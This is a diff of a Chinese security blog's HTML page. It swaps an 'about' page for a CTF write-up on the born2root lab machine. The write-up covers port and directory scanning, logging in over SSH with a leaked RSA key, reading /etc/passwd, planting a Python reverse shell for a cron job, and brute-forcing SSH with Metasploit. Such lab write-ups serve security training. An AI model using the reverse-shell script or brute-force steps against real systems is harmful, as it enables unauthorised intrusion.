@@ -7,20 +7,21 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
 
-<title>AqYoung - 安全羊</title>
+<title>CTF-SSH私钥泄露CTF-SSH服务测试 - AqYoung - 安全羊</title>
 
 
-    <meta name="description" content="WHO AM IHacker一个默默无闻的“渗透测试”学习者，朝着成为更高，更远的方向努力。 当前状态目前主要在挖掘漏洞和学习渗透测试相关的知识，扩宽自己的视野。提高编程能力和漏洞挖掘实战经验是我目前要努力的方向。 关注我GitHub @aqyoung">
-<meta property="og:type" content="website">
-<meta property="og:title" content="AqYoung - 安全羊">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;about&#x2F;index.html">
+    <meta name="description" content="一、实验环境攻击机：kali linux（192.168.43.153）NAT模式靶机：born2root">
+<meta name="keywords" content="CTF,SSH私钥">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-SSH私钥泄露CTF-SSH服务测试">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;14&#x2F;CTF-SSH%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2&#x2F;index.html">
 <meta property="og:site_name" content="AqYoung - 安全羊">
-<meta property="og:description" content="WHO AM IHacker一个默默无闻的“渗透测试”学习者，朝着成为更高，更远的方向努力。 当前状态目前主要在挖掘漏洞和学习渗透测试相关的知识，扩宽自己的视野。提高编程能力和漏洞挖掘实战经验是我目前要努力的方向。 关注我GitHub @aqyoung">
+<meta property="og:description" content="一、实验环境攻击机：kali linux（192.168.43.153）NAT模式靶机：born2root">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;og_image.png">
-<meta property="og:updated_time" content="2019-11-04T11:32:20.376Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;ssh.png">
+<meta property="og:updated_time" content="2019-12-14T06:55:11.952Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;og_image.png">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;images&#x2F;ssh.png">
 
 
 
@@ -86,7 +87,7 @@
         <div class="navbar-brand is-flex-center">
             <a class="navbar-item navbar-logo" href="/">
             
-                <img src="/images/logo.png" alt="" height="28">
+                <img src="/images/logo.png" alt="CTF-SSH私钥泄露CTF-SSH服务测试" height="28">
             
             </a>
         </div>
@@ -106,7 +107,7 @@
                 <a class="navbar-item"
                 href="/tags">标签</a>
                 
-                <a class="navbar-item is-active"
+                <a class="navbar-item"
                 href="/about">关于</a>
                 
             </div>
@@ -138,18 +139,94 @@
                 <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main">
 <div class="card">
     
+    <div class="card-image">
+        <span  class="image is-7by1">
+            <img class="thumbnail" src="/images/ssh.png" alt="CTF-SSH私钥泄露CTF-SSH服务测试">
+        </span>
+    </div>
+    
     <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2019-12-14T04:58:29.000Z">2019-12-14</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/CTF%E5%A4%BA%E6%97%97%E8%AE%AD%E7%BB%83/">CTF夺旗训练</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    7 分钟 读完 (大约 982 个字)
+                </span>
+                
+                
+            </div>
+        </div>
         
         <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
             
-                
+                CTF-SSH私钥泄露CTF-SSH服务测试
             
         </h1>
         <div class="content">
-            <h2 id="WHO-AM-I"><a href="#WHO-AM-I" class="headerlink" title="WHO AM I"></a><strong>WHO AM I</strong></h2><p>Hacker<br>一个默默无闻的“渗透测试”学习者，朝着成为更高，更远的方向努力。</p>
-<h2 id="当前状态"><a href="#当前状态" class="headerlink" title="当前状态"></a><strong>当前状态</strong></h2><p>目前主要在挖掘漏洞和学习渗透测试相关的知识，扩宽自己的视野。提高编程能力和漏洞挖掘实战经验是我目前要努力的方向。</p>
-<h2 id="关注我"><a href="#关注我" class="headerlink" title="关注我"></a><strong>关注我</strong></h2><p>GitHub @aqyoung</p>
+            <h2 id="一、实验环境"><a href="#一、实验环境" class="headerlink" title="一、实验环境"></a>一、实验环境</h2><p>攻击机：kali linux（192.168.43.153）NAT模式<br>靶机：born2root<a id="more"></a> 后面找机会把链接补上（192.168.0.6）桥接模式</p>
+<h2 id="二、实验过程"><a href="#二、实验过程" class="headerlink" title="二、实验过程"></a>二、实验过程</h2><p>1、当我们拿到目标主机的ip地址先用zenmap进行端口扫描<br><img src="/images/s1.png" alt><br>发现开启了22端口和80端口，接下来首先对80端口进行探测</p>
+<p>2、用dirb进行目录扫描发现<br><img src="/images/s2.png" alt><br><em>打开链接存在得到几个有用的信息</em></p>
+<ul>
+<li>可能作为ssh的登陆名<br><img src="/images/s3.png" alt></li>
+<li>得到RSA的私钥<br><img src="/images/s4.png" alt></li>
+</ul>
+<p>3、用上面得到的rsa私钥和用户名尝试登陆<br><img src="/images/s5.png" alt><br>结果比较幸运的是用martin成功登陆了目标主机，不过只是一个普通的权限<br><img src="/images/s6.png" alt></p>
+<p>4、接下来对得到的靶机进行扩大战果</p>
+<ul>
+<li><p>查看/home目录下的用户</p>
+</li>
+<li><p>查看/root目录是否存flag.txt</p>
+</li>
+<li><p>查看/tmp<br><img src="/images/s7.png" alt><br>发现了其他的用户，与之前判断的信息相符合</p>
+</li>
+<li><p>cat/etc/passwd  查看所有用户的列表cat/etc/group<br><img src="/images/s8.png" alt></p>
+</li>
+<li><p>挖掘/etc/crontab下是否有某个用户的定时计划文件<br><img src="/images/s9.png" alt><br>发现存在定时执行”.py”文件，但是/tmp里面呢并没有这个文件，于是我们尝试编写一个“反弹的shell”</p>
+<p>sekurity.py里面的内容为：<br> #/usr/bin/python<br> import os,subprocess,socket<br> s=socket.socket()<br> s.connect(“攻击机ip地址”,”攻击机监听端口”)<br> os.dup2(s.fileno(),0)<br> os.dup2(s.fileno(),1)<br> os.dup2(s.fileno(),2)<br> p=subprocess.call([“/bin/sh”,”-i”])</p>
+<p><img src="/images/s10.png" alt><br><em>开启监听</em><br>这里因为我的kali是用NAT，而靶机用的桥接模式，所以并没有收到反弹的shell</p>
+</li>
+</ul>
+<p>6、尝试对hadi账户ssh进行暴力破解<br><em>pass_file文件的准备</em><br>使用cupp进行个性化的密码生成<br><img src="/images/s12.png" alt><br><img src="/images/s13.png" alt><br>生成后，我们会在其路径下有一个txt文件<br><img src="/images/s14.png" alt></p>
+<p><em>使用msfconsole进行ssh登陆</em><br>使用对应的模块<br><img src="/images/s11.png" alt><br>设置参数<br><img src="/images/s15.png" alt><br>run<br><img src="/images/s16.png" alt><br>进入sessions<br><img src="/images/s17.png" alt><br>我们可以看到会话比较简陋<br>Python的模块进行优化<br><img src="/images/s19.png" alt><br>    python -c “import pty;pty.spawn(‘/bin/bash’)”</p>
+<p>7、成功提权拿到<strong>flag</strong><br><img src="/images/s18.png" alt></p>
+<h2 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h2><p><strong>（1）、初步嗅探</strong></p>
+<ul>
+<li>nmap主机发现、端口扫描</li>
+<li>目录扫描，查找敏感目录“‘robots.txt等”</li>
+</ul>
+<p><strong>（2）、扩大战果</strong><br>登录服务器之后，我们需要做以下操作。</p>
+<ul>
+<li>1、查看当前用户whoami </li>
+<li>2、id查看当前用户的权限 </li>
+<li>3、查看根目录寻找flag文件</li>
+</ul>
+<p>如果是root权限，那么表明这个靶场就被全部拿下。但是如果不是，就肯定需要提权。一般情况下，flag文件只属于root用户和对应的用户组；</p>
+<ul>
+<li>cat/etc/passwd  查看所有用户的列表cat/etc/group</li>
+<li>查看用户组 find/-user 用户名 </li>
+<li>查看属于某些用户的文件 /tmp  查看缓冲文件目录</li>
+</ul>
+<p><strong>（3）、深入挖掘</strong><br>通过/etc/crontab文件，设定系统定期执行的任务，编辑，需要roo权限。<br>挖掘/etc/crontab下是否有某个用户的定时计划文件，但是具体目录下没有这个定时执行的文件，可以自行创建反弹shell，然后netcat执行监听获取对应用户的权限。</p>
+<p><strong>（4）、具体思路</strong><br>在对SSH服务渗透中，大部分情况是利用获取的私钥文件，直接使用用户名和私钥文件登录靶场机器，个别情况进行暴力破解获取用户密码，通过用户名和对应用户登录靶场机器。<br>CTF中要特别注意/tmp数据缓冲目录以及/etc/crontab设置定时执行的文件</p>
 
+        </div>
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="has-link-grey -link" href="/tags/SSH%E7%A7%81%E9%92%A5/" rel="tag">SSH私钥</a>
+                </div>
+            </div>
         </div>
         
         
@@ -199,6 +276,20 @@
 </div>
 
 
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2019/11/04/%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E5%BF%AB%E9%80%9F%E6%9C%89%E6%95%88%E7%9A%84%E2%80%9C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%9D/">
+                <span class="level-item">如何进行快速有效的“信息收集”</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
 
 
 </div>
@@ -669,7 +760,7 @@
             <div class="level-start has-text-centered-mobile">
                 <a class="footer-logo is-block has-mb-6" href="/">
                 
-                    <img src="/images/logo.png" alt="" height="28">
+                    <img src="/images/logo.png" alt="CTF-SSH私钥泄露CTF-SSH服务测试" height="28">
                 
                 </a>
                 <p class="is-size-7">
